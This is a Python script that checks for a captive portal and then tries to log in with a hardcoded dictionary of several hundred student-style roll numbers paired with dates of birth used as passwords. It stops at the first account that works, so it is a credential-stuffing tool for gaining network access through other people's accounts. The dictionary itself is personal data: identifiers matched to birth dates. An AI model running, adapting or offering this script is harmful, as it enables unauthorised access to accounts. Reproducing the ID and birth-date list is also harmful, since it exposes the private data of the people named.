import requests
import subprocess


headers = \
    {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36'}


def login(uname, passw):
    url_1 = 'http://www.google.com'
    session = requests.Session()
    res = session.get(url_1, headers=headers)
    magic = res.url.split('?')[1]
    my_referer = res.url
    payload = {
        '4Tredir': 'http://google.com/',
        'username': uname,
        'password': passw,
        'magic': str(magic),
    }
    res = requests.post(my_referer, headers=headers, data=payload)
    # print res.text
    if 'Failed' in res.text:
        print(uname + 'failed')
        return False
    else:
        print(uname + ':' + passw)
        print(res.url)
        return True


def main():

    cmd = 'ip r | grep "default" | cut -d" " -f3'
    ps = subprocess.Popen(
        cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    output = ps.communicate()[0]
    ip_addr = output[:-1].decode("utf-8")
    # print(ip_addr)

    port = "1000"

    print("Checking connectivity..")
    try:
        res = requests.head('http://www.google.co.in')
        print('Already connected. :)')
        requests.get(
            url='http://'+ip_addr+':'+port+'/logout?0c0a0e0a0a1fea52', headers=headers)
        print("Logged out successfully")
    except requests.ConnectionError:

        details = {"B170006CE": "25-10-1999", "B170012EE": "05-08-1999", "B170013CE": "17-03-1999", "B170917CH": "06-05-1998", "B170022ME": "23-09-1999", "B170003AR": "23-10-1999", "B170001CE": "06-01-1999", "B170005EE": "23-12-1999", "B170008EE": "26-03-1999", "B170009AR": "26-08-1999", "B170017CH": "12-09-1999", "B170018ME": "05-11-1999", "B170021CE": "17-03-1999", "B170025ME": "03-04-1999", "B170026EC": "30-06-1999", "B170029ME": "28-09-1999", "B170030CH": "27-09-1999", "B170031PE": "07-12-1999", "B170032EP": "03-11-1999", "B170034CE": "10-09-1999", "B170039CE": "18-03-1999", "B170040AR": "17-05-1999", "B170041EC": "03-11-1999", "B170043CE": "24-07-1999", "B170045AR": "23-09-1998", "B170046ME": "05-10-1999", "B170048CH": "20-08-1999", "B170050EE": "19-04-1998", "B170051PE": "29-06-1999", "B170052ME": "01-04-1999", "B170053EP": "08-06-1999", "B170054ME": "12-02-1999", "B170056CS": "02-04-1999", "B170058EC": "11-05-1999", "B170066CE": "02-09-1999", "B170067CE": "08-03-1999", "B170070EE": "09-03-1998", "B170080PE": "21-10-1999", "B170082CE": "16-10-1999", "B170083CS": "30-09-1999", "B170090CE": "10-11-1999", "B170091ME": "31-03-1999", "B170092CH": "30-07-1999", "B170094CS": "11-11-1999", "B170095EC": "22-04-1998", "B170096AR": "22-10-1998", "B170098CH": "04-10-1999", "B170099EE": "03-04-1999", "B170100AR": "18-09-1999", "B170102CH": "05-05-1999", "B170107CE": "20-11-1999", "B170110ME": "24-11-1998", "B170113ME": "28-10-1998", "B170120EE": "07-09-1997", "B170122AR": "13-10-1999", "B170123EP": "03-06-1998", "B170124EC": "13-08-1999", "B170128AR": "22-12-1998", "B170130EC": "26-03-1998", "B170134EE": "01-02-1996", "B170138AR": "19-07-1999", "B170141EE": "07-11-1999", "B170144CH": "06-04-1999", "B170145EE": "27-06-1998", "B170146CH": "13-01-1999", "B170153CE": "25-06-1999", "B170157AR": "05-01-1999", "B170163CS": "03-02-1999", "B170166CE": "19-03-1998", "B170167CE": "21-07-1999", "B170172EE": "10-06-1998", "B170178CH": "13-05-1999", "B170180CE": "13-08-1999", "B170182AR": "22-03-1999", "B170187ME": "30-03-1998", "B170192CS": "04-09-1999", "B170198PE": "20-12-1998", "B170206CH": "24-07-1998", "B170208EE": "19-03-1998", "B170209EC": "10-08-1997", "B170211CE": "23-06-1996", "B170213ME": "06-12-1999", "B170215CE": "20-01-1999", "B170216EC": "12-05-1997", "B170219AR": "09-04-1998", "B170221AR": "20-04-1999", "B170223EC": "02-01-1998", "B170224CE": "30-10-1999", "B170229EC": "04-03-1999", "B170230ME": "19-08-1998", "B170233CH": "21-06-1999", "B170236CS": "24-10-1998", "B170243CH": "16-04-1999", "B170245EC": "19-03-1998", "B170246ME": "14-10-1999", "B170247CE": "29-04-1998", "B170248EE": "24-06-1999", "B170249EC": "24-06-1999", "B170251AR": "28-01-1998", "B170255CE": "13-06-1999", "B170256AR": "02-02-1999", "B170257CH": "09-04-1998", "B170264CE": "25-03-1999", "B170265ME": "26-08-1999", "B170267EC": "01-04-1999", "B170270ME": "04-03-1998", "B170271CE": "09-08-1999", "B170274EE": "17-11-1999", "B170275AR": "03-06-1998", "B170276CH": "10-07-1999", "B170278EP": "06-12-1997", "B170280EC": "10-10-1998", "B170283CH": "30-10-1998", "B170285AR": "03-07-1997", "B170288EE": "16-10-1999", "B170289EC": "07-05-1999", "B170290PE": "28-04-1998", "B170293ME": "21-11-1999", "B170295EC": "28-07-1999", "B170296EE": "24-11-1998", "B170297CS": "06-08-1997", "B170300AR": "26-06-1999", "B170301ME": "04-11-1999", "B170303CH": "21-08-1999", "B170309EE": "15-11-1998", "B170312ME": "13-04-1999", "B170315CS": "29-09-1999", "B170316ME": "05-08-1998", "B170317CE": "26-09-1999", "B170319CS": "14-06-1998", "B170320EE": "13-09-1999", "B170321EC": "18-06-1997", "B170324EE": "25-01-1999", "B170328EE": "11-05-1999", "B170329EE": "13-09-1998", "B170331EE": "22-12-1998", "B170337EE": "11-12-1999", "B170338CS": "15-07-1999", "B170340EC": "21-02-1997", "B170341CH": "16-06-1998", "B170342EC": "14-07-1998", "B170344EE": "14-10-1999", "B170345EE": "06-12-1999", "B170346EC": "29-03-1999", "B170352ME": "02-03-1999", "B170353EC": "15-03-1999", "B170354EE": "01-05-1998", "B170361EC": "28-08-1999", "B170362CH": "31-01-1999", "B170363CE": "05-01-1999", "B170367EE": "23-12-1997", "B170371CS": "06-12-1999", "B170378ME": "11-03-1999", "B170379EE": "07-04-1998", "B170387EE": "26-12-1999", "B170390CS": "02-08-1998", "B170392EE": "26-09-1999", "B170394BT": "11-06-1998", "B170398EE": "28-08-1999", "B170403ME": "29-07-1998", "B170407ME": "24-11-1999", "B170408ME": "01-06-1999", "B170410ME": "16-10-1999", "B170412EC": "10-09-1999", "B170417ME": "09-12-1998", "B170418CS": "19-09-1999", "B170419CH": "19-11-1997", "B170421CE": "27-11-1999", "B170426EC": "03-07-1998", "B170429CS": "01-06-1998", "B170430CS": "06-05-1999", "B170433CS": "07-05-1998", "B170436EP": "22-12-1998", "B170438CH": "17-08-1998", "B170439AR": "22-12-1999", "B170441ME": "25-12-1999", "B170443EC": "28-03-1998", "B170447BT": "02-05-1999", "B170448PE": "15-06-1999", "B170449EE": "01-09-1999", "B170450CE": "09-12-1998", "B170451EE": "08-12-1997", "B170462EC": "12-09-1999", "B170463CH": "15-12-1998", "B170467CS": "03-09-1998", "B170468CH": "12-10-1998", "B170469CH": "02-01-1999", "B170475ME": "05-07-1998", "B170477CH": "23-12-1999",
                   "B170478CE": "06-02-1998", "B170479ME": "15-05-1999", "B170481EE": "27-03-1998", "B170482ME": "22-05-1999", "B170483CE": "17-05-1999", "B170484ME": "07-04-1999", "B170486EE": "08-04-1999", "B170496EE": "28-06-1999", "B170497ME": "30-06-1998", "B170498CS": "21-04-1998", "B170501ME": "10-05-1998", "B170502CH": "01-04-1999", "B170503AR": "26-06-1999", "B170512CE": "19-07-1999", "B170517CE": "12-07-1997", "B170519CE": "07-09-1997", "B170522CS": "18-09-1999", "B170523AR": "20-07-1999", "B170525AR": "15-10-1999", "B170526EE": "10-01-1999", "B170527BT": "22-11-1996", "B170532EE": "05-04-1998", "B170534ME": "26-09-1998", "B170540CE": "10-12-1998", "B170545AR": "28-09-1999", "B170546EE": "15-10-1998", "B170559EE": "15-07-1999", "B170567CE": "30-01-1997", "B170568CH": "30-07-1999", "B170569EC": "25-05-1997", "B170570CH": "24-12-1997", "B170571PE": "10-10-1997", "B170573CE": "02-10-1999", "B170574EP": "17-06-1998", "B170575CS": "01-08-1999", "B170587CS": "04-05-1999", "B170588EP": "17-11-1998", "B170589CE": "10-07-1998", "B170591CH": "26-09-1998", "B170595EC": "07-03-1998", "B170596CE": "23-08-1999", "B170601EC": "17-08-1999", "B170602CS": "30-08-1999", "B170605EE": "20-03-1999", "B170607EC": "05-06-1998", "B170609EC": "09-04-1998", "B170610ME": "17-12-1998", "B170616EC": "04-10-1998", "B170619CE": "27-01-1999", "B170620CH": "12-04-1998", "B170621ME": "10-12-1999", "B170628CS": "23-09-1999", "B170630PE": "22-12-1999", "B170633EE": "15-06-1999", "B170637ME": "02-10-1998", "B170640EE": "23-10-1999", "B170644CE": "13-08-1998", "B170651ME": "23-04-1998", "B170652AR": "19-02-1999", "B170657CH": "05-06-1998", "B170660CS": "21-03-1999", "B170661EE": "01-03-1998", "B170662AR": "29-05-1999", "B170664CE": "16-03-1999", "B170668EP": "19-10-1999", "B170669EE": "16-01-1999", "B170670PE": "09-12-1998", "B170678CE": "31-05-1999", "B170679BT": "11-09-1999", "B170683ME": "03-12-1998", "B170684EE": "06-09-1998", "B170691BT": "22-01-1999", "B170695BT": "27-02-1998", "B170700EC": "26-01-1999", "B170701EC": "16-09-1997", "B170703CS": "05-10-1999", "B170704CH": "20-06-1998", "B170708CE": "31-10-1998", "B170709CH": "31-12-1996", "B170715AR": "17-08-1998", "B170717CE": "26-12-1999", "B170718ME": "03-06-1999", "B170722CS": "29-07-1999", "B170728CE": "19-07-1998", "B170729EP": "07-07-1998", "B170734CE": "17-06-1998", "B170735EE": "09-02-1998", "B170741ME": "16-10-1999", "B170744ME": "18-02-1999", "B170746EC": "14-10-1999", "B170749EE": "05-10-1998", "B170751CS": "28-06-1999", "B170754CE": "03-08-1998", "B170760ME": "20-05-1999", "B170766EE": "19-09-1999", "B170767CH": "07-11-1999", "B170769EE": "06-07-1999", "B170776CS": "12-04-1998", "B170785AR": "23-08-1998", "B170786PE": "05-09-1999", "B170788CH": "30-01-1999", "B170789CS": "15-09-1999", "B170790ME": "28-02-1999", "B170791PE": "02-08-1998", "B170792CE": "08-06-1999", "B170793CE": "07-05-1999", "B170795EE": "29-03-1999", "B170797CH": "26-07-1998", "B170798CH": "03-08-1997", "B170802CE": "14-11-1997", "B170803ME": "12-09-1998", "B170806EE": "22-09-1996", "B170807EE": "15-03-1999", "B170825EC": "28-02-1999", "B170827AR": "21-10-1999", "B170830EE": "04-02-1999", "B170832CE": "21-09-1998", "B170834EE": "25-10-1998", "B170835CE": "07-06-1999", "B170848CE": "01-05-1999", "B170866ME": "09-12-1999", "B170868CE": "18-09-1999", "B170870ME": "13-12-1999", "B170871EE": "12-03-1999", "B170879EC": "27-01-1999", "B170885EE": "27-07-1999", "B170887ME": "13-10-1999", "B170895ME": "21-12-1998", "B170896ME": "11-02-1998", "B170898CE": "07-03-1998", "B170900EE": "07-06-1998", "B170901CS": "24-09-1998", "B170904CE": "30-05-1999", "B170905PE": "10-12-1998", "B170906CE": "11-12-1998", "B170907CE": "27-01-1999", "B170908CH": "25-07-1998", "B170909BT": "11-03-1999", "B170910PE": "02-05-1999", "B170911CE": "27-04-1999", "B170912EC": "10-08-1999", "B170913CH": "10-11-1999", "B170914CE": "25-10-1997", "B170915CS": "03-08-1999", "B170916EE": "18-12-1999", "B170918EE": "01-04-1999", "B170919CE": "27-10-1998", "B170920EP": "30-01-1999", "B170921PE": "09-11-1998", "B170924CH": "13-03-1998", "B170925ME": "01-09-1998", "B170926CH": "18-01-1999", "B170930PE": "11-09-1999", "B170932PE": "19-02-1999", "B170933CH": "18-12-1999", "B170940BT": "27-02-1999", "B170941EC": "30-08-1999", "B170943CE": "20-08-1997", "B170949PE": "15-04-1999", "B170950EE": "15-01-1998", "B170954EP": "27-12-1998", "B170961CE": "20-12-1999", "B170963CS": "19-12-1999", "B170969CE": "27-06-1999", "B170972CH": "23-08-1999", "B170974ME": "14-09-1999", "B170975ME": "08-03-1999", "B170976EC": "13-08-1999", "B170977CH": "25-08-1999", "B170978EP": "21-04-1999", "B170979CE": "14-04-1999", "B171041CH": "01-10-1999", "B171045CH": "25-04-1999", "B171047PE": "10-10-1998", "B171053PE": "03-03-1999", "B171054CE": "12-05-1998", "B171055PE": "13-12-1997", "B171057EE": "11-07-1999", "B171059BT": "02-12-1999", "B171061PE": "11-04-1999", "B171064PE": "20-10-1999", "B171068CH": "30-10-1998", "B171069CH": "24-07-1998", "B171070EC": "12-05-1998", "B171071EP": "14-03-1997", "B171074PE": "01-01-1998", "B171075CE": "08-04-1999", "B171077CE": "02-10-1999", "B171078CE": "13-06-1999"}

        cache = {"B170449EE": "01-09-1999", "B170664CE": "16-03-1999", "B170678CE": "31-05-1999", "B171053PE": "03-03-1999", "B170722CS": "29-07-1999", "B170776CS": "12-04-1998", "B171069CH": "24-07-1998", "B170715AR": "17-08-1998", "B171041CH": "01-10-1999", "B170708CE": "31-10-1998", "B170022ME": "23-09-1999", "B170589CE": "10-07-1998", "B170463CH": "15-12-1998", "B170439AR": "22-12-1999", "B170421CE": "27-11-1999", "B170344EE": "14-10-1999", "B170407ME": "24-11-1999", "B170788CH": "30-01-1999", "B170906CE": "11-12-1998", "B170387EE": "26-12-1999", "B170026EC": "30-06-1999", "B170871EE": "12-03-1999", "B170913CH": "10-11-1999", "B170630PE": "22-12-1999", "B171074PE": "01-01-1998", "B171061PE": "11-04-1999", "B170317CE": "26-09-1999", "B171078CE": "13-06-1999",
                 "B170496EE": "28-06-1999", "B170932PE": "19-02-1999", "B170767CH": "07-11-1999", "B170215CE": "20-01-1999", "B170141EE": "07-11-1999", "B170145EE": "27-06-1998", "B171055PE": "13-12-1997", "B170034CE": "10-09-1999", "B170835CE": "07-06-1999", "B170167CE": "21-07-1999", "B170803ME": "12-09-1998", "B170328EE": "11-05-1999", "B170172EE": "10-06-1998", "B170479ME": "15-05-1999", "B170206CH": "24-07-1998", "B170620CH": "12-04-1998", "B171045CH": "25-04-1999", "B170924CH": "13-03-1998", "B170303CH": "21-08-1999", "B170451EE": "08-12-1997", "B170219AR": "09-04-1998", "B170475ME": "05-07-1998", "B170046ME": "05-10-1999", "B170975ME": "08-03-1999", "B171059BT": "02-12-1999", "B170662AR": "29-05-1999", "B170094CS": "11-11-1999", "B170398EE": "28-08-1999"}

        for key in cache:
            username = key
            password = details[key]
            if login(username, password):
                # r = get(
                    # url="http://172.16.12.1:1000/logout?0c0a0e0a0a1fea52", headers=headers)
                print("Logged in")
                exit(0)
            else:
                pass

        for key in details:
            username = key
            password = details[key]
            if login(username, password):
                # r = get(
                    # url="http://172.16.12.1:1000/logout?0c0a0e0a0a1fea52", headers=headers)
                print("Logged in")
                break
            else:
                pass


if __name__ == '__main__':
    main()
